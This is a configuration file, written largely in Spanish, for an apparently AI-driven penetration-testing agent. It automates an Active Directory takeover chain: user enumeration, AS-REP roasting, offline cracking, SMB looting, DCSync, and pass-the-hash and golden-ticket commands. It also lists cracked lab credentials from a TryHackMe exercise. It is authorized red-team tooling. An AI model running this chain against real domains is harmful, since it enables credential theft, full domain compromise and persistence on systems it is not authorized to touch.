---
name: active-directory-roast
description: "Active Directory domain takeover with a DETERMINISTIC pre-fire: ldapsearch -> kerbrute userenum -> AS-REP roast -> john crack -> SMB loot -> secretsdump (DCSync) -> WinRM Pass-the-Hash -> flags, run BEFORE the LLM so the 7-step Windows chain doesn't depend on a small local model driving it. Solo activable con keywords fuertes (NO matchea 'AD' / 'kerberos' genérico) — requiere autorización escrita."
triggers:
  tech: []
  ports: []
  keywords:
    # F205 — keywords ESPECÍFICOS (evita auto-activación amplia / regresión F203.U).
    - "active directory pentest"
    - "active ad pentest"
    - "ad roast"
    - "asreproast deterministic"
    - "kerberoast deterministic"
    - "pentest activo active directory"
    - "domain takeover"
    - "fire asreproast"
priority: 3
required_tools:
  - run_command
  # Post-takeover validation (present under KRYON_RED_TEAM).
  - validate_auth_bypass
  - calculate_mitre_coverage
pre_hooks:
  # F205 — full AD domain takeover, deterministic-first. ldapsearch domain -> kerbrute userenum (+ a
  # curated common-AD-account seed) -> GetNPUsers AS-REP -> john crack (NOT hashcat: no GPU in the
  # container) -> nxc smb loot (base64 cred files) -> secretsdump DCSync -> nxc winrm Pass-the-Hash ->
  # Desktop flags. The cred chain + Administrator NTLM + flags are injected as authoritative facts so the
  # agent builds on a real domain compromise instead of re-driving a 7-step Windows chain (which Ornith-9B
  # does only ~1-in-N runs). Read-only enum + offline crack; only the SMB/WinRM auth uses cracked creds
  # (no writes to the DC). ~90s userenum + ~180s crack + loot/dump, so timeout_s 600.
  - python: ./cwe-detection/ad_roast_hook.py:run
    args:
      target: "{ctx.target}"
    inject_as: active_directory_domain_takeover
    required: false
    timeout_s: 1800
---

# Active Directory domain takeover (F205) — deterministic AS-REP roast → DCSync → PtH

**⚠️ ACTIVA SOLO con autorización escrita.** Brute/roast real contra un Domain Controller. Solo se dispara
con la frase explícita **"active directory pentest"** (o "ad roast" / "domain takeover" / "fire asreproast")
+ `KRYON_RED_TEAM=true`.

## Por qué pre_hook determinista (la lección de WordPress, aplicada a AD)

El chain-planner YA tiene las 8 reglas AD (`ad_enum_domain_users`, `asreproast_full_chain`,
`secretsdump_with_creds`, etc.) y la cadena está validada en aislamiento. Pero el **modelo local chico
(Ornith-9B) no maneja confiablemente una cadena Windows de 7 pasos** — la misma variancia que necesitó el
pre_hook de WordPress. Validado en vivo contra THM AttacktiveDirectory: la cadena DETERMINISTA toma el
dominio entero (`svc-admin:management2005` → `backup:backup2517860` → Administrator NTLM `0e0363...` →
`TryHackMe{4ctiveD1rectoryM4st3r}`), pero el modelo solo la drivea de punta a punta con suerte.

El pre_hook corre la cadena ANTES del LLM e inyecta el resultado como hecho autoritativo: el agente arranca
desde un **dominio ya comprometido** (creds + Administrator NTLM + flags) en vez de tener que ejecutarla.

## Qué hace el pre_hook (`cwe-detection/ad_roast_hook.py`)

1. **Domain**: `ldapsearch` rootDSE → dominio (unauth).
2. **Users**: `kerbrute userenum` (seclists) + un seed curado de cuentas AD comunes (administrator, backup,
   svc-admin, svc-*, krbtgt...) para que una cuenta de servicio sin preauth se pruebe aunque esté profunda
   en el wordlist grande.
3. **AS-REP roast**: `GetNPUsers.py -no-pass` → hashes krb5asrep de cuentas con preauth deshabilitada.
4. **Crack**: **`john --format=krb5asrep`** (NO hashcat — sin GPU en el container, hashcat sale 0 sin
   crackear; john crackea en CPU en segundos).
5. **SMB loot**: `nxc smb` con cada cred → shares legibles → archivos tipo credencial (`.txt/.xml/.bak`),
   base64-decode (ej. `backup_credentials.txt` → `backup@domain:pass`).
6. **DCSync**: `secretsdump.py` con cualquier cred con derechos → NTDS dump → Administrator NTLM + krbtgt.
7. **PtH**: `nxc winrm -H <NTLM>` como Administrator → lee los flags de cada Desktop.

## Qué hacer con el resultado inyectado

El pre_hook deja: las creds AS-REP, las creds lootadas de SMB, el **Administrator NTLM**, el krbtgt, y los
flags. **NO re-roastees ni re-crackees.** Pasos siguientes:

- **Pass-the-Hash** con el Administrator NTLM: `evil-winrm -i <dc> -u administrator -H <ntlm>` o
  `psexec.py -hashes :<ntlm> administrator@<dc>` → shell SYSTEM.
- **Golden ticket** con el krbtgt hash (persistencia, si está en scope): `ticketer.py`.
- **Registrar** el compromiso con `validate_auth_bypass` + `calculate_mitre_coverage` (T1558.004
  AS-REP roasting, T1003.006 DCSync, T1550.002 PtH) para el reporte.

## Banca-safe / scope

- Enum LDAP/Kerberos read-only + cracking offline; la única auth "activa" es SMB/WinRM read-only con las
  creds crackeadas (sin escrituras al DC). Solo contra targets con **autorización escrita**; la frase-gatillo
  explícita + `KRYON_RED_TEAM` evitan disparos accidentales.
